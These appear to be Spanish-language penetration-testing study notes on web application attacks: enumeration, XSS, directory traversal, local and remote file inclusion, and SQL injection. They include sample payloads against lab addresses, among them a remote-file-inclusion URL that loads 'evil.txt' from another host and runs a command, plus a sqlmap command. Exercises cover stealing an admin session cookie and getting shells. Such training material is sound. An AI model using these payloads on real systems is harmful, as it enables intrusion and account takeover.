# Web Application Atacks

Propietario: Adrian Gisbert Cabello

### 1. Metodología de Evaluación de Aplicaciones Web

- **Objetivo**: Identificar y explotar vulnerabilidades comunes en aplicaciones web.
- **Pasos Iniciales**:
    - ¿Qué hace la aplicación?
    - ¿En qué lenguaje está escrita?
    - ¿Qué software de servidor usa?
    - Responder estas preguntas guiará hacia posibles vectores de ataque.

### 2. Enumeración de Aplicaciones Web

- **Componentes a Identificar**:
    - Lenguaje de programación y frameworks.
    - Software del servidor web.
    - Software de base de datos.
    - Sistema operativo del servidor.

### 3. Herramientas de Enumeración

- **Firefox Developer Tools**: Inspección de recursos y contenido de la página.
- **Extensiones de archivo en URLs**: `.php`, `.jsp`, `.do`, `.html`.
- **Contenido de la Página**: Comentarios, campos de entrada ocultos, controles del lado del cliente, etc.

### 4. Vulnerabilidades Comunes en Aplicaciones Web

### 4.1. Cross-Site Scripting (XSS)

- **Tipos de XSS**:
    - **Stored XSS**: El payload se almacena en el servidor.
    - **Reflected XSS**: El payload se refleja en la respuesta del servidor.
    - **DOM-Based XSS**: La vulnerabilidad reside en la manipulación del DOM por parte del navegador.
- **Identificación de XSS**:
    - Examinar campos de entrada que aceptan datos no saneados.
    - Ingresar caracteres especiales y observar la salida.
- **Ejemplo de Payload XSS**:
    
    ```html
    <script>alert('XSS')</script>
    ```
    

### 4.2. Directory Traversal

- **Descripción**: Permite el acceso no autorizado a archivos en el servidor.
- **Identificación**:
    - Examinar cadenas de consulta en URLs y cuerpos de formularios.
    - Buscar extensiones de archivo en cadenas de consulta.
    - Probar con rutas conocidas como `/etc/passwd` en Linux o `c:\boot.ini` en Windows.
- **Ejemplo de Explotación en Windows**:
    
    ```bash
    http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
    ```
    

### 4.3. File Inclusion

- **Local File Inclusion (LFI)**: Incluir archivos locales en el servidor.
- **Remote File Inclusion (RFI)**: Incluir archivos remotos.
- **Explotación**:
    - Usar null bytes (`%00`) para truncar cadenas y evitar extensiones añadidas por el servidor.
    - Usar signos de interrogación (`?`) para marcar el inicio de una cadena de consulta.
- **Ejemplo de Payload RFI**:
    
    ```bash
    http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
    ```
    

### 4.4. SQL Injection

- **Descripción**: Inyección de código SQL en la consulta del servidor.
- **Identificación**:
    - Probar con caracteres como `'`, `-`, `;` en campos de entrada.
    - Observar errores y respuestas inesperadas.
- **Herramientas**:
    - **sqlmap**: Automatiza el proceso de identificación y explotación de SQL Injection.
    - **Ejemplo**:
        
        ```bash
        sqlmap -u "http://10.11.0.22/vulnerable.php?id=1" --dbs
        ```
        

### 5. Herramientas Adicionales

- **Burp Suite**: Herramienta integral para pruebas de penetración de aplicaciones web.
- **Nikto**: Escáner de vulnerabilidades en servidores web.
    
    ```bash
    nikto -h http://1.1.1.1
    ```
    

### 6. Ejercicios

1. **Exploit Stored XSS**:
    - Insertar un payload XSS en un campo de comentario.
    - Obtener la cookie de sesión del administrador.
    - Usar un editor de cookies para establecer la cookie robada en tu navegador y acceder a la cuenta del administrador.
2. **Directory Traversal**:
    - Probar diferentes rutas y archivos para descubrir información sensible.
    - Usar la técnica para facilitar un ataque de inclusión de archivos si es posible.
3. **SQL Injection**:
    - Identificar y explotar una vulnerabilidad de SQL Injection para obtener acceso a la base de datos.
    - Intentar obtener un shell en el servidor a través de SQL Injection.
4. **File Inclusion**:
    - Explotar una vulnerabilidad de inclusión de archivos para ejecutar un shell en el servidor.